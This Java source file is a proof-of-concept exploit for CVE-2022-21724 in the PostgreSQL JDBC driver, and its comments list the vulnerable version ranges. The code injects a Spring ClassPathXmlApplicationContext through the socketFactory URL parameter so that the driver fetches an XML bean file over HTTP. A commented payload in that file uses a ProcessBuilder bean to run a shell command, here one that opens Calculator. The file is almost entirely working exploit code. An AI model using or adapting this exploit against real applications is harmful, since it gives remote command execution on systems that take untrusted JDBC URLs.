package org.example;

import java.sql.Connection;
import java.sql.DriverManager;

import org.postgresql.Driver;

// CVE-2022-21724 RCE
// Test in MacOS
// OpenJDK 22
// 9.4.1208 <= PgJDBC < 42.2.25
// 42.3.0 <= PgJDBC < 42.3.2
public class PGSQL_RCE {
    public static void main(String[] args) throws Exception {
        String socketFactory = "org.springframework.context.support.ClassPathXmlApplicationContext";
        String socketFactoryArg = "http://127.0.0.1:8000/CVE-2022-21724.exp.xml";
        String socketFactoryURL = "jdbc:postgresql://127.0.0.1:5432/test?socketFactory="
                + socketFactory + "&socketFactoryArg="
                + socketFactoryArg;
        // String SSLFactoryURL = "jdbc:postgresql://127.0.0.1:5432/postgres/?sslfactory="+socketFactory+"&sslfactoryarg="+socketFactoryArg; //需要顺利登录
        System.out.println(socketFactoryURL);
        DriverManager.registerDriver(new Driver());
        Connection connection = DriverManager.getConnection(socketFactoryURL);
        connection.close();
    }
}

//calc.xml
//<beans xmlns="http://www.springframework.org/schema/beans"
//xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
//xmlns:p="http://www.springframework.org/schema/p"
//xsi:schemaLocation="http://www.springframework.org/schema/beans
//http://www.springframework.org/schema/beans/spring-beans.xsd">
//
//   <bean id="exec" class="java.lang.ProcessBuilder" init-method="start">
//        <constructor-arg>
//          <list>
//            <value>bash</value>
//            <value>-c</value>
//            <value>open -a Calculator</value>
//          </list>
//        </constructor-arg>
//    </bean>
//</beans>
